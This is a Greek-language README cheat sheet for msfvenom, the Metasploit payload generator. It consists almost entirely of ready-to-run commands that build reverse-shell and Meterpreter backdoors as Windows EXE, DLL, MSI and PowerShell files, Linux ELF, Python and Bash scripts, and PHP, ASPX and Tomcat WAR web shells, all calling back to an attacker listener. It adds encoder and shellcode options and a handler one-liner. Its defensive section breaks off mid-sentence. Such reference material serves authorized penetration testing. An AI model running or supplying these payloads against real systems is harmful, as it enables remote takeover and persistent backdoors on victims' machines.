<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💣 Msfvenom - Πλήρες φύλλο εξαπάτησης

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```
<p align="center">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Payloads">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Formats">
</p>

<p align="center">
  <b>💣 Κύριο cheatsheet για τη δημιουργία μεμονωμένων ωφέλιμων φορτίων, κωδίκων κελύφους και backdoors σε πλατφόρμες Windows, Linux, macOS, Android και Ιστού</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Επισκόπηση & Αρχιτεκτονική ωφέλιμου φορτίου](#-επισκόπηση--αρχιτεκτονική ωφέλιμου φορτίου)
  - [Staged vs Stageless Payloads](#staged-vs-stageless-payloads)
- [Essential Flags & Options](#-essential-flags--options)
- [Windows Payloads (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
- [Ωφέλιμα φορτία Linux και Unix (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
- [Καλώσιμα φορτία Web & Web Shell (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
- [Shellcode Generation for Exploit Development (C, Raw, Python)](#-shellcode-generation-for-exploit-development-c-raw-python)
  - [Stripping Bad Characters (`-b`)](#stripping-bad-characters--b)
  - [Κωδικοποιητές και πολλαπλές επαναλήψεις (`-e`, `-i`)](#encoders--multiple-iterations--e--i)
- [Γρήγορη εγκατάσταση πολλαπλών χειριστηρίων Metasploit] (#-metasploit-multi-handler-quick-setup)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & Αρχιτεκτονική ωφέλιμου φορτίου

Συνδυάζοντας τα κλασικά βοηθητικά προγράμματα `msfpayload` και `msfencode`, το **msfvenom** δημιουργεί δυαδικά εκτελέσιμα, σενάρια και ακατέργαστο κώδικα κελύφους για δοκιμή εκμετάλλευσης και διείσδυσης.

### Σταδιακά έναντι ωφέλιμων φορτίων χωρίς σταδιακά
- **Σταδιοποιημένο (π.χ. `windows/x64/meterpreter/reverse_tcp`):**
  Χρησιμοποιεί κάθετες μεταξύ των στοιχείων. Ένα μικροσκοπικό στέλεχος (στάδιο 0) συνδέεται πίσω με τον ακροατή και φέρνει το πλήρες ανακλαστικό DLL (στάδιο 1) στη μνήμη. Ιδανικό για exploits με αυστηρά όρια μήκους buffer.
- **Στάδιο (π.χ. `windows/x64/meterpreter_reverse_tcp`):**
  Χρησιμοποιεί υπογράμμιση (`_`). Ολόκληρο το ωφέλιμο φορτίο του Meterpreter είναι αυτόνομο εντός του εκτελέσιμου αρχείου ή του shellcode. Λειτουργεί αξιόπιστα χωρίς να βασίζεται σε δικτυακές χειραψίες πολλαπλών σταδίων, καθιστώντας το ιδανικό για δρομείς γραμμής εντολών και επιμονή αποφυγής.

---

## ⚙️ Βασικές σημαίες και επιλογές
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
| Σημαία | Περιγραφή |
|------|-------------|
| `-p, --payload` | Καθορίζει το ωφέλιμο φορτίο που θα χρησιμοποιηθεί (`--list payloads` για προβολή όλων). |
| `-f, --format` | Μορφή εξόδου (exe, elf, raw, c, python, asp, aspx, war, php). |
| `-e, --encoder` | Κωδικοποιητής Shellcode για την εξάλειψη κακών χαρακτήρων (`--list encoders`). |
| `-i, --iterations` | Αριθμός περασμάτων κωδικοποίησης. |
| `-b, --bad-chars` | Χαρακτήρες που πρέπει να αποφεύγονται σε shellcode (π.χ. `\x00\x0a\x0d`). |
| `-x, --template` | Εκτελέσιμο πρότυπο για εισαγωγή ωφέλιμου φορτίου. |
| `-k, --keep` | Διατηρεί την κανονική εκτέλεση του προτύπου σε ένα νέο νήμα. |
| `-o, --out` | Διαδρομή αρχείου προορισμού εξόδου. |

---

## 🪟 Windows Payloads (EXE, DLL, MSI, PowerShell)

### Windows x64 Reverse Shell Executable (Stageless)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
### Windows x64 Staded Reverse TCP Executable
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```
### Windows DLL Injection Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```
### Windows MSI Installer (Κλιμάκωση προνομίων μέσω AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```
### Κωδικοποιημένη εντολή PowerShell Base64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```
---

## 🐧 ωφέλιμα φορτία Linux και Unix (ELF, Python, Bash)

### Linux x64 ELF Binary (Stageless)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```
### Linux Standard `/bin/sh` Reverse TCP (Χωρίς μετρητή)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```
### Αυτόνομη δέσμη ενεργειών Python Reverse Shell
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```
### Συμβολοσειρά εντολών Pure Bash
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```
---

## 🌐 Ωφέλιμα φορτία Web & Web Shell (PHP, ASP, ASPX, JSP, WAR)

### PHP Reverse Meterpreter Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```
### Κλασικό ASP & ASPX (Διακομιστές IIS)
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```
### Πακέτο Java WAR (Αρχείο Ιστού Apache Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```
---

## 🔬 Shellcode Generation for Exploit Development (C, Raw, Python)

### Απογύμνωση κακών χαρακτήρων (`-b`)
Τα μηδενικά byte (`\x00`), οι επιστροφές μεταφοράς (`\r` = `\x0d`) και οι νέες γραμμές (`\n` = `\x0a`) διακόπτουν τις καταστροφές μνήμης που βασίζονται σε συμβολοσειρές (π.χ. υπερχειλίσεις στοίβας):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```
### Κωδικοποιητές και πολλαπλές επαναλήψεις (`-e`, `-i`)
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```
---

## 🎧 Γρήγορη εγκατάσταση πολλαπλών χειριστηρίων Metasploit

Πάντα να πιάνετε ωφέλιμα φορτία χρησιμοποιώντας το `multi/handler` της Metasploit:
```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Πλατφόρμα στόχου | Εντολή |
|-----------------|---------|
| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **PHP Web Shell** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **Tomcat WAR** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **Ακατέργαστος Shellcode (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ Αμυντικές Θεωρήσεις & Ανίχνευση

1. **Ανίχνευση στατικής υπογραφής:** Τα προεπιλεγμένα πρότυπα και κωδικοποιητές Msfvenom (`shikata_ga_nai`) έχουν γνωστές στατικές υπογραφές που αναγνωρίζονται σχεδόν από κάθε σύγχρονη μηχανή προστασίας από ιούς.
2. **Παρακολούθηση EDR της συμπεριφοράς:** Οι παράγοντες EDR επισημαίνουν την ανώμαλη διαδικασία αναπαραγωγής (π.χ.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Το Msfvenom δημιουργεί λειτουργικά επιθετικά ωφέλιμα φορτία και κερκόπορτες. Πρέπει να χρησιμοποιείται αυστηρά κατά τη διάρκεια εξουσιοδοτημένων δοκιμών διείσδυσης και σε απομονωμένα εργαστηριακά ερευνητικά περιβάλλοντα. Η μη εξουσιοδοτημένη δημιουργία ή εκτέλεση σε υπολογιστές τρίτων είναι παράνομη.